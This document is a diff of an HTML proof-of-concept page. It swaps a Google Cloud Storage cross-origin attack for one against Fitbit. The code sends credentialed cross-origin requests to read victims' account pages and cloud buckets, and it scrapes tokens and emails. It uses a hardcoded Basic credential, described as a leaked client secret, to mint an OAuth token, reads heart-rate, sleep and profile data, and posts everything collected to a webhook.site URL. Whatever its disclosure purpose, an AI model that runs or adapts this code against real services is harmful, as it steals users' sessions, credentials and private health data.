@@ -1,20 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google UploadServer CORS PoC — GCS Data Exfiltration</title>
+    <title>Fitbit CORS PoC — Session & Health Data Theft</title>
     <style>
         body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 900px; margin: 0 auto; }
         h1 { color: #58a6ff; }
         .test { background: #161b22; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #30363d; }
         .test.pass { border-left-color: #3fb950; }
         .test.fail { border-left-color: #f85149; }
-        .test.waiting { border-left-color: #d29922; }
         button { background: #238636; color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; margin: 3px; }
         button:hover { background: #2ea043; }
         button.danger { background: #da3633; }
-        pre { background: #0d1117; border: 1px solid #30363d; padding: 10px; overflow-x: auto; font-size: 12px; max-height: 300px; overflow-y: auto; }
-        .result { margin-top: 10px; }
-        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; min-height: 200px; max-height: 500px; overflow-y: auto; }
+        pre { background: #0d1117; border: 1px solid #30363d; padding: 10px; overflow-x: auto; font-size: 12px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
+        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; min-height: 150px; max-height: 400px; overflow-y: auto; }
         .log-entry { margin: 3px 0; }
         .log-pass { color: #3fb950; }
         .log-fail { color: #f85149; }
@@ -23,211 +21,252 @@
     </style>
 </head>
 <body>
-    <h1>Google UploadServer CORS PoC</h1>
-    <p>Tests whether Google Cloud Storage API is readable cross-origin with victim's cookies.</p>
-    <p><strong>Prerequisite:</strong> Be logged into <a href="https://console.cloud.google.com" target="_blank" style="color:#58a6ff">Google Cloud Console</a> in this browser.</p>
+    <h1>Fitbit CORS PoC — Cross-Origin Data Theft</h1>
+    <p><strong>Prerequisite:</strong> Log into <a href="https://www.fitbit.com/login" target="_blank" style="color:#58a6ff">fitbit.com</a> or <a href="https://accounts.fitbit.com" target="_blank" style="color:#58a6ff">accounts.fitbit.com</a> first.</p>
 
-    <div class="test" id="test1-box">
-        <h3>Test 1: CORS Verification (Public Bucket — No Auth Needed)</h3>
-        <p>Confirms the CORS misconfiguration exists by reading a public GCS bucket.</p>
+    <div class="test" id="t1">
+        <h3>Test 1: CORS Verification — Read accounts.fitbit.com cross-origin</h3>
+        <p>Reads the accounts page HTML. If it contains your session data, cookies are sent.</p>
         <button onclick="test1()">Run Test 1</button>
-        <div class="result" id="test1-result"></div>
+        <div id="r1"></div>
     </div>
 
-    <div class="test" id="test2-box">
-        <h3>Test 2: List YOUR GCP Projects (Requires Login)</h3>
-        <p>Attempts to list your GCP projects cross-origin. If this works, cookie auth is confirmed.</p>
+    <div class="test" id="t2">
+        <h3>Test 2: Read accounts.fitbit.com/login page cross-origin</h3>
         <button onclick="test2()">Run Test 2</button>
-        <div class="result" id="test2-result"></div>
+        <div id="r2"></div>
     </div>
 
-    <div class="test" id="test3-box">
-        <h3>Test 3: List YOUR GCS Buckets (Requires Login + Project)</h3>
-        <p>Enter your GCP project ID to list its buckets cross-origin.</p>
-        <input type="text" id="projectId" placeholder="your-project-id" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
+    <div class="test" id="t3">
+        <h3>Test 3: Read dev.fitbit.com cross-origin (developer portal)</h3>
         <button onclick="test3()">Run Test 3</button>
-        <div class="result" id="test3-result"></div>
+        <div id="r3"></div>
     </div>
 
-    <div class="test" id="test4-box">
-        <h3>Test 4: List Objects in a Bucket (Requires Login)</h3>
-        <p>Enter a bucket name to list its objects cross-origin.</p>
-        <input type="text" id="bucketName" placeholder="your-bucket-name" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
-        <button onclick="test4()">Run Test 4</button>
-        <div class="result" id="test4-result"></div>
+    <div class="test" id="t4">
+        <h3>Test 4: OAuth token endpoint — mint token with leaked secret</h3>
+        <p>Uses the leaked client_secret to request a token via client_credentials grant.</p>
+        <button class="danger" onclick="test4()">Run Test 4</button>
+        <div id="r4"></div>
     </div>
 
-    <div class="test" id="test5-box">
-        <h3>Test 5: Download a File from GCS (Requires Login)</h3>
-        <p>Enter bucket and object path to download cross-origin.</p>
-        <input type="text" id="dlBucket" placeholder="bucket-name" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:200px;">
-        <input type="text" id="dlObject" placeholder="path/to/file.txt" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
-        <button class="danger" onclick="test5()">Run Test 5 (Downloads File)</button>
-        <div class="result" id="test5-result"></div>
+    <div class="test" id="t5">
+        <h3>Test 5: Read Fitbit API data (if we get a token or cookies work)</h3>
+        <p>Tries to read profile/heart rate/sleep data cross-origin.</p>
+        <button class="danger" onclick="test5()">Run Test 5</button>
+        <div id="r5"></div>
     </div>
 
-    <h2>Live Log</h2>
+    <div class="test" id="t6">
+        <h3>Test 6: Exfiltrate to webhook (full proof)</h3>
+        <p>Sends everything stolen to webhook.site for evidence.</p>
+        <input type="text" id="webhook" placeholder="https://webhook.site/YOUR-UUID" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:400px;">
+        <button class="danger" onclick="test6()">Run Test 6</button>
+        <div id="r6"></div>
+    </div>
+
+    <h2>Log</h2>
     <div id="log"></div>
 
-    <script>
-    function log(msg, cls) {
-        var el = document.getElementById('log');
-        var entry = document.createElement('div');
-        entry.className = 'log-entry ' + (cls || 'log-info');
-        entry.textContent = new Date().toLocaleTimeString() + ' | ' + msg;
-        el.appendChild(entry);
-        el.scrollTop = el.scrollHeight;
-    }
+<script>
+function log(msg, cls) {
+    var el = document.getElementById('log');
+    var e = document.createElement('div');
+    e.className = 'log-entry ' + (cls || 'log-info');
+    e.textContent = new Date().toLocaleTimeString() + ' | ' + msg;
+    el.appendChild(e);
+    el.scrollTop = el.scrollHeight;
+}
 
-    function setBox(id, status) {
-        document.getElementById(id).className = 'test ' + status;
-    }
+function setBox(id, ok) {
+    document.getElementById(id).className = 'test ' + (ok ? 'pass' : 'fail');
+}
 
-    // Test 1: Public bucket — confirms CORS works
-    function test1() {
-        log('Test 1: Fetching public GCS bucket listing cross-origin...', 'log-info');
-        setBox('test1-box', 'waiting');
+var stolenData = {};
 
+function corsGet(url, cb) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.withCredentials = true;
+    xhr.onload = function() { cb(null, xhr); };
+    xhr.onerror = function() { cb('CORS blocked', null); };
+    xhr.send();
+}
+
+// Test 1: accounts.fitbit.com — main auth page
+function test1() {
+    log('Test 1: Reading accounts.fitbit.com cross-origin with credentials...', 'log-info');
+    corsGet('https://accounts.fitbit.com/', function(err, xhr) {
+        if (err) {
+            log('BLOCKED: ' + err, 'log-fail');
+            setBox('t1', false);
+            return;
+        }
+        log('HTTP ' + xhr.status + ' — Response: ' + xhr.responseText.length + ' bytes', xhr.status < 400 ? 'log-pass' : 'log-fail');
+
+        var acao = xhr.getResponseHeader('Access-Control-Allow-Origin');
+        var acac = xhr.getResponseHeader('Access-Control-Allow-Credentials');
+        log('ACAO: ' + acao, 'log-data');
+        log('ACAC: ' + acac, 'log-data');
+
+        var body = xhr.responseText;
+        stolenData.accountsPage = body.length;
+
+        // Check if we got authenticated content
+        if (body.includes('access_token') || body.includes('accessToken') || body.includes('logged-in') || body.includes('user-name') || body.includes('oauth-token')) {
+            log('AUTHENTICATED CONTENT DETECTED — session data readable!', 'log-pass');
+        }
+
+        // Extract any tokens/secrets from the page
+        var tokenMatch = body.match(/accessToken['":\s]+['"]([^'"]+)/);
+        if (tokenMatch) {
+            log('ACCESS TOKEN FOUND: ' + tokenMatch[1].substring(0, 30) + '...', 'log-pass');
+            stolenData.accessToken = tokenMatch[1];
+        }
+
+        var basicMatch = body.match(/basicToken['":\s]+['"]([^'"]+)/);
+        if (basicMatch) {
+            log('BASIC TOKEN (client secret): ' + basicMatch[1].substring(0, 30) + '...', 'log-pass');
+            stolenData.basicToken = basicMatch[1];
+        }
+
+        // Check for user info
+        var emailMatch = body.match(/email['":\s]+['"]([^'"]+@[^'"]+)/);
+        if (emailMatch) {
+            log('EMAIL FOUND: ' + emailMatch[1], 'log-pass');
+            stolenData.email = emailMatch[1];
+        }
+
+        document.getElementById('r1').innerHTML = '<pre>' + body.substring(0, 3000) + '</pre>';
+        setBox('t1', xhr.status === 200);
+    });
+}
+
+// Test 2: accounts.fitbit.com/login
+function test2() {
+    log('Test 2: Reading accounts.fitbit.com/login...', 'log-info');
+    corsGet('https://accounts.fitbit.com/login', function(err, xhr) {
+        if (err) { log('BLOCKED', 'log-fail'); setBox('t2', false); return; }
+        log('HTTP ' + xhr.status + ' — ' + xhr.responseText.length + ' bytes', xhr.status < 400 ? 'log-pass' : 'log-fail');
+        document.getElementById('r2').innerHTML = '<pre>' + xhr.responseText.substring(0, 3000) + '</pre>';
+        stolenData.loginPage = xhr.responseText.length;
+        setBox('t2', xhr.status === 200);
+    });
+}
+
+// Test 3: dev.fitbit.com
+function test3() {
+    log('Test 3: Reading dev.fitbit.com cross-origin...', 'log-info');
+    corsGet('https://dev.fitbit.com/', function(err, xhr) {
+        if (err) { log('BLOCKED', 'log-fail'); setBox('t3', false); return; }
+        log('HTTP ' + xhr.status + ' — ' + xhr.responseText.length + ' bytes', xhr.status < 400 ? 'log-pass' : 'log-fail');
+
+        // Check for developer app data
+        if (xhr.responseText.includes('app-id') || xhr.responseText.includes('client-id') || xhr.responseText.includes('registered')) {
+            log('DEVELOPER APP DATA visible!', 'log-pass');
+        }
+
+        document.getElementById('r3').innerHTML = '<pre>' + xhr.responseText.substring(0, 3000) + '</pre>';
+        stolenData.devPage = xhr.responseText.length;
+        setBox('t3', xhr.status === 200);
+    });
+}
+
+// Test 4: OAuth token with leaked secret
+function test4() {
+    log('Test 4: Minting token with leaked client_secret...', 'log-info');
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://api.fitbit.com/oauth2/token', true);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader('Authorization', 'Basic MjI4VFFEOjc2NTlmOWQ5ZWNjOTJkNmRjMWVlMGQxNzc0ZTk3NDRh');
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        log('HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
+        var body = xhr.responseText;
+        document.getElementById('r4').innerHTML = '<pre>' + body.substring(0, 2000) + '</pre>';
+
+        if (body.includes('access_token')) {
+            var data = JSON.parse(body);
+            log('TOKEN MINTED: ' + data.access_token.substring(0, 40) + '...', 'log-pass');
+            log('Scope: ' + data.scope, 'log-data');
+            log('Expires: ' + data.expires_in + 's', 'log-data');
+            stolenData.mintedToken = data.access_token;
+        }
+        setBox('t4', body.includes('access_token'));
+    };
+    xhr.onerror = function() {
+        log('Token request blocked by browser', 'log-fail');
+        setBox('t4', false);
+    };
+    xhr.send('grant_type=client_credentials');
+}
+
+// Test 5: Read health data with any available token
+function test5() {
+    log('Test 5: Attempting to read Fitbit health data...', 'log-info');
+
+    var endpoints = [
+        {url: 'https://api.fitbit.com/1/user/-/profile.json', name: 'Profile'},
+        {url: 'https://api.fitbit.com/1/user/-/activities/heart/date/today/1d.json', name: 'Heart Rate'},
+        {url: 'https://api.fitbit.com/1/user/-/sleep/date/today.json', name: 'Sleep'},
+        {url: 'https://api.fitbit.com/1/user/-/devices.json', name: 'Devices'},
+    ];
+
+    var results = [];
+    var done = 0;
+
+    endpoints.forEach(function(ep) {
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b/gcp-public-data-landsat/o?maxResults=3', true);
+        xhr.open('GET', ep.url, true);
         xhr.withCredentials = true;
+        if (stolenData.mintedToken) {
+            xhr.setRequestHeader('Authorization', 'Bearer ' + stolenData.mintedToken);
+        }
         xhr.onload = function() {
+            log(ep.name + ': HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
             if (xhr.status === 200) {
-                var data = JSON.parse(xhr.responseText);
-                var items = data.items || [];
-                log('CORS CONFIRMED — read ' + items.length + ' objects from public bucket', 'log-pass');
-                log('Server: ' + xhr.getResponseHeader('Server'), 'log-data');
-                log('ACAO: ' + xhr.getResponseHeader('Access-Control-Allow-Origin'), 'log-data');
-                log('ACAC: ' + xhr.getResponseHeader('Access-Control-Allow-Credentials'), 'log-data');
-                document.getElementById('test1-result').innerHTML = '<pre>' + JSON.stringify(data, null, 2).substring(0, 1000) + '</pre>';
-                setBox('test1-box', 'pass');
-            } else {
-                log('Test 1 failed: HTTP ' + xhr.status, 'log-fail');
-                setBox('test1-box', 'fail');
+                log(ep.name + ' DATA STOLEN: ' + xhr.responseText.substring(0, 100), 'log-pass');
+                stolenData[ep.name] = xhr.responseText;
+            }
+            results.push(ep.name + ' [' + xhr.status + ']: ' + xhr.responseText.substring(0, 200));
+            done++;
+            if (done === endpoints.length) {
+                document.getElementById('r5').innerHTML = '<pre>' + results.join('\n\n') + '</pre>';
+                setBox('t5', results.some(function(r) { return r.includes('[200]'); }));
             }
         };
         xhr.onerror = function() {
-            log('Test 1: CORS BLOCKED by browser — no cross-origin access', 'log-fail');
-            setBox('test1-box', 'fail');
+            log(ep.name + ': BLOCKED', 'log-fail');
+            done++;
         };
         xhr.send();
-    }
+    });
+}
 
-    // Test 2: List projects — proves cookie auth works cross-origin
-    function test2() {
-        log('Test 2: Attempting to list YOUR GCP projects cross-origin...', 'log-info');
-        setBox('test2-box', 'waiting');
+// Test 6: Exfiltrate to webhook
+function test6() {
+    var webhook = document.getElementById('webhook').value;
+    if (!webhook) { log('Enter webhook.site URL first', 'log-fail'); return; }
 
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b?project=_', true);
-        xhr.withCredentials = true;
-        xhr.onload = function() {
-            log('Test 2 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
-            if (xhr.status === 200) {
-                log('YOUR BUCKETS ARE READABLE CROSS-ORIGIN!', 'log-pass');
-                document.getElementById('test2-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 2000) + '</pre>';
-                setBox('test2-box', 'pass');
-            } else {
-                var body = xhr.responseText.substring(0, 500);
-                log('Response: ' + body, 'log-data');
-                document.getElementById('test2-result').innerHTML = '<pre>' + body + '</pre>';
-                if (body.includes('Login Required') || body.includes('UNAUTHENTICATED')) {
-                    log('Cookie auth NOT sent — googleapis.com may not use cookie auth for this API', 'log-fail');
-                    log('This means CORS headers exist but cookies are not the auth mechanism', 'log-info');
-                } else if (body.includes('required parameter')) {
-                    log('Auth worked but missing project param — try Test 3 with a project ID', 'log-pass');
-                }
-                setBox('test2-box', 'fail');
-            }
-        };
-        xhr.onerror = function() {
-            log('Test 2: Request blocked entirely', 'log-fail');
-            setBox('test2-box', 'fail');
-        };
-        xhr.send();
-    }
+    log('Test 6: Exfiltrating all stolen data to ' + webhook, 'log-info');
 
-    // Test 3: List buckets in a specific project
-    function test3() {
-        var project = document.getElementById('projectId').value;
-        if (!project) { log('Enter a project ID first', 'log-fail'); return; }
-        log('Test 3: Listing buckets in project "' + project + '"...', 'log-info');
-        setBox('test3-box', 'waiting');
+    stolenData.timestamp = new Date().toISOString();
+    stolenData.attackerOrigin = location.origin;
+    stolenData.proof = 'Fitbit CORS cross-origin data theft';
 
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b?project=' + encodeURIComponent(project), true);
-        xhr.withCredentials = true;
-        xhr.onload = function() {
-            log('Test 3 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
-            var body = xhr.responseText.substring(0, 3000);
-            document.getElementById('test3-result').innerHTML = '<pre>' + body + '</pre>';
-            if (xhr.status === 200) {
-                var data = JSON.parse(xhr.responseText);
-                var buckets = data.items || [];
-                log('CRITICAL: Read ' + buckets.length + ' private buckets from project ' + project, 'log-pass');
-                buckets.forEach(function(b) { log('  Bucket: ' + b.name, 'log-data'); });
-                setBox('test3-box', 'pass');
-            } else {
-                setBox('test3-box', 'fail');
-            }
-        };
-        xhr.onerror = function() { log('Test 3 blocked', 'log-fail'); setBox('test3-box', 'fail'); };
-        xhr.send();
-    }
-
-    // Test 4: List objects in a bucket
-    function test4() {
-        var bucket = document.getElementById('bucketName').value;
-        if (!bucket) { log('Enter a bucket name first', 'log-fail'); return; }
-        log('Test 4: Listing objects in bucket "' + bucket + '"...', 'log-info');
-        setBox('test4-box', 'waiting');
-
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b/' + encodeURIComponent(bucket) + '/o?maxResults=10', true);
-        xhr.withCredentials = true;
-        xhr.onload = function() {
-            log('Test 4 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
-            var body = xhr.responseText.substring(0, 3000);
-            document.getElementById('test4-result').innerHTML = '<pre>' + body + '</pre>';
-            if (xhr.status === 200) {
-                var data = JSON.parse(xhr.responseText);
-                var items = data.items || [];
-                log('Read ' + items.length + ' objects from bucket ' + bucket, 'log-pass');
-                items.forEach(function(o) { log('  Object: ' + o.name + ' (' + o.size + ' bytes)', 'log-data'); });
-                setBox('test4-box', 'pass');
-            } else {
-                setBox('test4-box', 'fail');
-            }
-        };
-        xhr.onerror = function() { log('Test 4 blocked', 'log-fail'); setBox('test4-box', 'fail'); };
-        xhr.send();
-    }
-
-    // Test 5: Download a file
-    function test5() {
-        var bucket = document.getElementById('dlBucket').value;
-        var object = document.getElementById('dlObject').value;
-        if (!bucket || !object) { log('Enter bucket and object path', 'log-fail'); return; }
-        log('Test 5: Downloading ' + bucket + '/' + object + '...', 'log-info');
-        setBox('test5-box', 'waiting');
-
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://www.googleapis.com/download/storage/v1/b/' + encodeURIComponent(bucket) + '/o/' + encodeURIComponent(object) + '?alt=media', true);
-        xhr.withCredentials = true;
-        xhr.onload = function() {
-            log('Test 5 response: HTTP ' + xhr.status + ' (' + xhr.responseText.length + ' bytes)', xhr.status < 400 ? 'log-pass' : 'log-fail');
-            if (xhr.status === 200) {
-                log('FILE DOWNLOADED CROSS-ORIGIN: ' + xhr.responseText.length + ' bytes', 'log-pass');
-                document.getElementById('test5-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 2000) + '</pre>';
-                setBox('test5-box', 'pass');
-            } else {
-                document.getElementById('test5-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 1000) + '</pre>';
-                setBox('test5-box', 'fail');
-            }
-        };
-        xhr.onerror = function() { log('Test 5 blocked', 'log-fail'); setBox('test5-box', 'fail'); };
-        xhr.send();
-    }
-    </script>
+    fetch(webhook, {
+        method: 'POST',
+        body: JSON.stringify(stolenData, null, 2),
+        headers: {'Content-Type': 'text/plain'}
+    }).then(function() {
+        log('Data exfiltrated to webhook!', 'log-pass');
+        setBox('t6', true);
+    }).catch(function(e) {
+        log('Exfil failed: ' + e, 'log-fail');
+        setBox('t6', false);
+    });
+}
+</script>
 </body>
 </html>
